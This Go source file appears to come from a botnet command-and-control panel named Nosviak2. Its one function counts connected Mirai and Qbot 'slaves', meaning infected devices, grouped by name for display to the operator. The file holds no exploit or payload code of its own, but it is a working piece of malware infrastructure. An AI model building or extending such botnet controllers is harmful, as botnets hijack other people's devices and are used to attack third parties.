package slaves

import (
	"Nosviak2/core/slaves/mirai"
	"Nosviak2/core/slaves/qbot"
)

//produce 2 maps of arrays of strings and ints
//this will be used to allow us to view system information
func MakeMappableSheet() [2]map[string]int { //return map properly


	var miraiOUT map[string]int = make(map[string]int) //mirai slaves
	var QbotOUT  map[string]int = make(map[string]int) //qbot slaves

	//ranges through all possible Mirai slaves
	//this will ensure its done without errors happening
	for _, MiraiSystem := range mirai.MiraiSlaves.All {
	
		//checks if it exists properly and safely within
		//allows us to safely and properly build the map
		if _, ok := miraiOUT[Sanatize(MiraiSystem.Name)]; ok {
			miraiOUT[Sanatize(MiraiSystem.Name)]++ //registers another
		} else {
			miraiOUT[Sanatize(MiraiSystem.Name)] = 1 //makes a new one
		}
	}

	//ranges through all possible Mirai slaves
	//this will ensure its done without errors happening
	for _, QbotClient := range qbot.QbotClients {
	
		//checks if it exists properly and safely within
		//allows us to safely and properly build the map
		if _, ok := QbotOUT[Sanatize(QbotClient.Name)]; ok {
			QbotOUT[Sanatize(QbotClient.Name)]++ //registers another
		} else {
			QbotOUT[Sanatize(QbotClient.Name)] = 1 //makes a new one
		}
	}

	return [2]map[string]int{miraiOUT, QbotOUT}
} 